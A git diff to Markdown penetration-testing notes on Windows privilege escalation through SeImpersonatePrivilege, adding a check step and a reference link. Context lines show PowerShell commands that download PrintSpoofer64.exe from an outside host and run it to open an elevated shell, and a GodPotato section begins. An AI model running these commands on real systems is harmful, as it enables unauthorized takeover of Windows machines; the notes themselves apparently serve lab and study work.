@@ -55,16 +55,18 @@ SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
 SeCreateGlobalPrivilege       Create global objects                     Enabled 
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 ```
+Verify if **SeImpersonatePrivilege** is enabled.
+Useful link: https://jlajara.gitlab.io/Potatoes_Windows_Privesc.
 
 ### Exploit by PrintSpoofer64
-If **SeImpersonatePrivilege** enabled, PrintSpoofer64.exe can exploit the local system and elevate the privileges.
+PrintSpoofer64.exe can exploit the local system and elevate the privileges.
 ``` powershell
 iwr http://192.168.1.1:8888/PrintSpoofer64.exe -outfile PrintSpoofer64.exe      ## download on target system
 .\PrintSpoofer64.exe -i -c powershell.exe                                       ## exploit
 ```
 
 ### Exploit by GodPotato
-If **SeImpersonatePrivilege** enabled, PrintSpoofer64.exe can exploit the local system and run command with elevate privilege.
+GodPotato.exe can exploit the local system and run command with elevate privilege.
 
 Generate a payload and a listester:
 ``` bash
